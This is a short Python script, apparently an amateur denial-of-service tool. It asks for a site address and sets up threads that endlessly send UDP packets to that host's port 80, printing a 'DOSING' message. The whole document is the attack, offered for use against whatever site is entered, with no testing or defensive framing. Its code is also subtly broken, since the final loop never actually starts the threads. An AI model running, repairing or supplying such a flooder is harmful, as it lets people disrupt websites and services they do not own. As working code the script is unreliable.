
import socket
import threading
Site = input("pleas enter site address.  ... ")
port = 80
mess = "Hackermts3113"*100
ip   = socket.gethostbyname(Site)
def attac():

   while True: 
    sock = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
    sock.sendto(bytes(mess,"UTF-8"),(ip,port))
    print("packet send | target :"+Site+" | DOSING ... \n ")

while 1<5000:
    threading.Thread(target=attac).start
